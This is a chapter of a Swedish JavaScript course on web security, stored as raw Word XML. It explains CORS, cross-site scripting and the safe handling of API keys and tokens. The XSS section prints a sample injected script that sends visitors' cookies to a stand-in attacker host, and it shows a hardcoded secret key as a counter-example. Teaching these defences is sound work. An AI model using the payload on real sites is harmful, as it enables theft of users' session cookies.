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8D5B0" w14:textId="36248DDF" w:rsidR="000E2055" w:rsidRPr="000E2055" w:rsidRDefault="00C35D42" w:rsidP="000E2055">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Rubrik1Char"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251684864" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0158F74E" wp14:editId="239C8F98">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-36830</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="9181698" cy="6673076"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="161175542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55421" name="Bildobjekt 1611755421"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId8">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect r="22737"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="9181698" cy="66730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3E23"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3B8A798"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009B3E23" w:rsidRPr="000137B2">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251678720" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="587859D3" wp14:editId="33636D4B">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72EB5623"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left:0;text-align:left;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72EB5623"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v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00B63A96" w:rsidRPr="000137B2">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5DFD7017" wp14:editId="1D223B8D">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DDFC9AD"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54A7879B">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48E199C6" w14:textId="7FCD2CFD" w:rsidR="009E4D5D" w:rsidRDefault="00971774" w:rsidP="009E4D5D">
                            <w:pPr>
                              <w:pStyle w:val="DokRubrik"/>
                            </w:pPr>
                            <w:r w:rsidRPr="009B3E23">
                              <w:t>JavaScript-</w:t>
                            </w:r>
                            <w:r w:rsidR="000E2055">
                              <w:t>12</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="11D51C32" w14:textId="6ED23293" w:rsidR="00971774" w:rsidRPr="009B3E23" w:rsidRDefault="000E2055" w:rsidP="009E4D5D">
                            <w:pPr>
                              <w:pStyle w:val="DokRubrik"/>
                            </w:pPr>
                            <w:r>
                              <w:t>Säkerhet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left:0;text-align:left;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48E199C6" w14:textId="7FCD2CFD" w:rsidR="009E4D5D" w:rsidRDefault="00971774" w:rsidP="009E4D5D">
                      <w:pPr>
                        <w:pStyle w:val="DokRubrik"/>
                      </w:pPr>
                      <w:r w:rsidRPr="009B3E23">
                        <w:t>JavaScript-</w:t>
                      </w:r>
                      <w:r w:rsidR="000E2055">
                        <w:t>12</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="11D51C32" w14:textId="6ED23293" w:rsidR="00971774" w:rsidRPr="009B3E23" w:rsidRDefault="000E2055" w:rsidP="009E4D5D">
                      <w:pPr>
                        <w:pStyle w:val="DokRubrik"/>
                      </w:pPr>
                      <w:r>
                        <w:t>Säkerhet</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C1EDE79" w14:textId="77777777" w:rsidR="00971774" w:rsidRPr="009B3E23" w:rsidRDefault="00971774" w:rsidP="009E4D5D">
                            <w:pPr>
                              <w:pStyle w:val="DokInfo"/>
                            </w:pPr>
                            <w:r w:rsidRPr="009B3E23">
                              <w:t>JavaScript – utan tjafs</w:t>
                            </w:r>
                            <w:r w:rsidRPr="009B3E23">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2C1EDE79" w14:textId="77777777" w:rsidR="00971774" w:rsidRPr="009B3E23" w:rsidRDefault="00971774" w:rsidP="009E4D5D">
                      <w:pPr>
                        <w:pStyle w:val="DokInfo"/>
                      </w:pPr>
                      <w:r w:rsidRPr="009B3E23">
                        <w:t>JavaScript – utan tjafs</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009B3E23">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0291CD2"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1E24688B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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1645F86C" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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6C08E07A" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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163BDFD5" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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4A9F2A7" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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648F622B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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3C2811ED" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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2A5ED62B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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3F9192BB" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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59E2A639" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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603BB6CA" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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FC477EE" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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24644A8B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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48CC4D73"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E24688B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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645F86C" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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C08E07A" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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163BDFD5" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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4A9F2A7" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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48F622B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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C2811ED" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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A5ED62B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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F9192BB" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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9E2A639" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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03BB6CA" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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FC477EE" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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4644A8B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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48CC4D73"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361F84"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5CE48FE5" w14:textId="77777777" w:rsidR="000F6597" w:rsidRPr="000F6597" w:rsidRDefault="000F6597" w:rsidP="00013F54">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5CE48FE5" w14:textId="77777777" w:rsidR="000F6597" w:rsidRPr="000F6597" w:rsidRDefault="000F6597" w:rsidP="00013F54">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r w:rsidR="000E2055" w:rsidRPr="000E2055">
        <w:rPr>
          <w:rStyle w:val="Rubrik1Char"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Säkerhet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9AA50B" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>När du bygger applikationer i JavaScript räcker det inte med att koden fungerar och är snabb – den måste också vara säker. Webbläsaren är en väldigt öppen miljö där vem som helst kan högerklicka och inspektera din kod.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBA643F" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>I det här kapitlet ska vi gå igenom tre kritiska säkerhetsområden: det ökända CORS-felet, hur vi stoppar skadlig kod från att köras (XSS), samt hur vi hanterar känsliga API-nycklar och tokens på ett säkert sätt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A4A925" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>________________________________________</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F9A545" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Rubrik2"/>
      </w:pPr>
      <w:r>
        <w:t>CORS-fel – Webbläsarens inbyggda dörrvakt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6145FDB7" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t xml:space="preserve">Har du någon gång försökt göra ett fetch()-anrop till ett API och mötts av ett rött, argt felmeddelande i konsolen där det står något om </w:t>
      </w:r>
      <w:r w:rsidRPr="000E2055">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:t>? Du är inte ensam. Det är förmodligen det vanligaste felet som drabbar webbutvecklare.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5523486A" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>CORS står för Cross-Origin Resource Sharing. Det är en säkerhetsfunktion i webbläsaren som blockerar din JavaScript-kod från att hämta data från en annan webbplats/server, såvida inte den servern uttryckligen har gett din sajt tillåtelse att göra det.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459DF521" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Webbläsaren gör detta för att skydda användare. Om du är inloggad på din bank, ska inte en skadlig spelsajt du har öppen i en annan flik kunna köra JavaScript i bakgrunden som gör fetch-anrop och tömmer ditt bankkonto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D1DF09" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>[ Din sajt: localhost:3000 ] ───( Fetch-anrop )───</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
        </w:rPr>
        <w:t>➔</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [ API-Server ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29663343" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                                  │</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C966C2" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>[ Webbläsaren blockerar svaret! ]       ◄──( Saknar CORS-header )─┘</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5977FD03" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 1 Om servern inte skickar med CORS stoppas datan av säkerhetsskäl.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B324271" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>CORS är inte ett fel i din JavaScript-kod. Det är en inställning på servern du anropar. Om det är din egen server måste du ställa in den så att den skickar med rätt "headers" (t.ex. Access-Control-Allow-Origin: *). Om det är ett externt API som saknar detta, måste anropet istället göras via en egen backend som fungerar som en mellanhand (proxy).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022BC78A" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>________________________________________</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7B8D60" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055">
      <w:pPr>
        <w:spacing w:after="160" w:line="278" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3F6AFB" w14:textId="78E95555" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Rubrik2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>XSS (Cross-Site Scripting) – Injicering av skadlig kod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF81785" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Ett av de farligaste säkerhetshålen i frontend-utveckling kallas för XSS. Det sker när en hackare lyckas "lura" din webbsida att köra skadlig JavaScript-kod som du inte har skrivit själv.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AB1837" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Detta händer oftast när du tar emot data från en användare (t.ex. en kommentar i ett forum eller ett namn i ett sökfält) och trycker ut det direkt på skärmen med hjälp av innerHTML.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCCDA16" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD74B3E" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  fetch('http://hacker.se?stjäl_cookies=' + document.cookie)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6E6DC8" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197646A2" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 2 Elak användare har skrivit in dum kod i t.ex. ett input-fält.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6980786F" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Om du sparar den kommentaren och visar den för andra användare så här:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00993463" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>// FARLIGT: Om kommentaren innehåller &lt;script&gt; kommer koden att köras!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107B6953" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>kommentarsLåda.innerHTML = användarensKommentar;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698440D6" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 3 Här kommer den farliga koden köras.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B8331D" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Då kommer dolda script att köras i bakgrunden hos alla som besöker sidan, och hackaren kan stjäla deras inloggningsuppgifter!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628DA7C4" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Det absolut enklaste sättet att skydda sig mot XSS är att aldrig använda innerHTML när du visar text som en användare har skrivit. Använd istället textContent eller innerText. Då fattar webbläsaren att det bara är vanlig text, och eventuella &lt;script&gt;-taggar blir helt ofarliga.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F69E7F0" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>// SÄKERT: Webbläsaren översätter koden till ren text och kör den inte</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF3C4F1" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>kommentarsLåda.textContent = användarensKommentar;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED73AFA" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 4 Genom att använda textContent saneras texten automatiskt och görs helt ofarlig.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FE5219" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>________________________________________</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A07BA5" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Rubrik2"/>
      </w:pPr>
      <w:r>
        <w:t>Säker hantering av API-nycklar och Tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A2F416" w14:textId="7DD8E8A4" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>När dina studenter har byggt API-kopplingar har de säkert använt en API-nyckel eller en JWT (JSON Web Token) för att logga in eller identifiera sig mot servern. En gyllene regel inom webbutveckling är: Spara aldrig hemliga API-nycklar direkt i din frontend-kod.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Om du skriver din hemliga nyckel direkt i din main.js.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437AED1F" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>// ALDRIG SÅ HÄR!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE7A523" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>const HEMLIG_NYCKEL = "xyz123_super_hemlig_kod";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB7189E" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 5 Skriv INTE ut hemliga nycklar direkt i koden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D382443" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Då kan vem som helst hitta den genom att öppna DevTools eller titta i ditt GitHub-repo. Det kan sluta med att någon stjäl din nyckel och bygger appar på ditt konto (vilket kan bli dyrt!).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD40763" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:r>
        <w:t>Tre grundregler för säker data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2C5447" w14:textId="51FD6E52" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Liststycke"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:ind w:left="890"/>
      </w:pPr>
      <w:r>
        <w:t>Använd miljövariabler (.env): Om du bygger med byggverktyg som t.ex. Vite, använd .env-filer för att gömma nycklar under utvecklingen, och se till att filen ligger med i .gitignore.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11AA169D" w14:textId="5B0C7B4F" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Liststycke"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:ind w:left="890"/>
      </w:pPr>
      <w:r>
        <w:t>Kör känsliga anrop via en backend: Om ett API kräver en privat nyckel som inte får läcka ut, skicka anropet från JavaScript till din egen server först, och låt din server göra det riktiga anropet i bakgrunden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45325163" w14:textId="54B309DC" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Liststycke"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:ind w:left="890"/>
      </w:pPr>
      <w:r>
        <w:t>HttpOnly Cookies: När en användare loggar in och får en token, be din backend-utvecklare att skicka tillbaka den som en HttpOnly-cookie istället för att du sparar den i LocalStorage. Då är den helt skyddad mot XSS-attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36692054" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>[ Sämre / Osäkert ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A09F66D" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>LocalStorage (Kan kommas åt via XSS-attacker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3FB17A" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05887528" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>[ Bättre / Säkert ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F033F4B" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Kodstycke"/>
      </w:pPr>
      <w:r>
        <w:t>HttpOnly Cookies (Låsta i webbläsaren, JavaScript kan inte läsa dem)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA01031" w14:textId="77777777" w:rsidR="000E2055" w:rsidRDefault="000E2055" w:rsidP="000E2055">
      <w:pPr>
        <w:pStyle w:val="Bildtext"/>
      </w:pPr>
      <w:r>
        <w:t>Bild 6: Känsliga inloggnings-tokens bör skickas som HttpOnly-kakor från servern.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0384E1" w14:textId="0999E984" w:rsidR="00047CB2" w:rsidRPr="000137B2" w:rsidRDefault="00047CB2" w:rsidP="00FC1BC5"/>
    <w:sectPr w:rsidR="00047CB2" w:rsidRPr="000137B2">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D0720" w14:textId="77777777" w:rsidR="00085ACF" w:rsidRPr="00065C87" w:rsidRDefault="00085ACF" w:rsidP="00013F54">
      <w:r w:rsidRPr="00065C87">
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3C116394" w14:textId="77777777" w:rsidR="00085ACF" w:rsidRPr="00065C87" w:rsidRDefault="00085ACF" w:rsidP="00013F54">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9ED6E"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5306619D" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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91814"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265D69EB" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00047CB2" w:rsidP="00013F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71543"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4FB74F14" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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8DA2A" w14:textId="77777777" w:rsidR="00085ACF" w:rsidRPr="00065C87" w:rsidRDefault="00085ACF" w:rsidP="00013F54">
      <w:r w:rsidRPr="00065C87">
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0ECF4794" w14:textId="77777777" w:rsidR="00085ACF" w:rsidRPr="00065C87" w:rsidRDefault="00085ACF" w:rsidP="00013F54">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ECB62" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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7600DDA9" id="Group 2148" o:spid="_x0000_s1026" style="position:absolute;margin-left:46.1pt;margin-top:48.95pt;width:502.45pt;height:4.45pt;z-index:251658240;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NS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ZzaBBFW+hS9CC4grSgXyTJ5Q74ehtDsVKas73zW66R&#10;anr44Xzfk+Vo0Xq02FGNpoXOfrGnDfUhLmQZTNJN7qoeryrstvrAHzX6+YsLgyTPu1JNveK9jy0B&#10;vqPH+DeIN/WMDfJPb7iC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DNAg1JtAgAAMwYAAA4AAAAAAAAAAAAA&#10;AAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAGAAgAAAAhADqDuGvgAAAACgEAAA8AAAAAAAAA&#10;AAAAAAAAxwQAAGRycy9kb3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADUBQAAAAA=&#10;">
              <v:shape id="Shape 2310"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" path="m,l6380989,r,56388l,56388,,e" fillcolor="#34aba2" stroked="f" strokeweight="0">
                <v:stroke miterlimit="83231f" joinstyle="miter"/>
                <v:path arrowok="t" textboxrect="0,0,6380989,56388"/>
              </v:shape>
              <w10:wrap type="square" anchorx="page" anchory="page"/>
            </v:group>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
  </w:p>
  <w:p w14:paraId="790D7518" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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E07D6C7" id="Group 215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E4161" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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5614C894"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311EF06B" w14:textId="77777777" w:rsidR="00047CB2" w:rsidRPr="00065C87" w:rsidRDefault="00000000" w:rsidP="00013F54">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652BEC2"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18E"/>
